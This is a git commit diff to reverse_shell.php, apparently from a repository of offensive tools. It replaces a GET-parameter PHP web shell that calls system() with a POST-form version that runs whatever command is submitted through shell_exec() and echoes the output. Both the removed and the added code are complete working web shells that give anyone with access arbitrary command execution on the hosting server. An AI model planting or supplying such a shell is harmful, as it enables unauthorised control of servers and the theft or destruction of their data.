4ebefb4cfbe3305dc20c58415280317372f2d3bb
BoutadjineAlaa <117209192+BoutadjineAlaa@users.noreply.github.com>
2024-02-16 18:30:35 +0100

    Update reverse_shell.php

--- reverse_shell.php
+++ reverse_shell.php
@@ -1,17 +1,17 @@
-<html>
-<body>
-<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
-<input type="TEXT" name="cmd" id="cmd" size="80">
-<input type="SUBMIT" value="Execute">
-</form>
 <pre>
+<form method="post" action="<?php echo $_SERVER['PHP_SELF'];?>">
+  <textarea name="command" rows="10" cols="80"></textarea>
+  <input type="submit" value="Execute" />
+</form>
+
 <?php
-    if(isset($_GET['cmd']))
-    {
-        system($_GET['cmd']);
-    }
+if ($_SERVER["REQUEST_METHOD"] == "POST") {
+  $command = $_POST["command"];
+  $output = shell_exec($command);
+  echo "<hr/><b>Command:</b> " . htmlspecialchars($command) . "<br/>";
+  echo "<b>Output:</b><br/>" . htmlspecialchars($output);
+}
 ?>
+
+<h3>Command Output</h3>
 </pre>
-</body>
-<script>document.getElementById("cmd").focus();</script>
-</html>
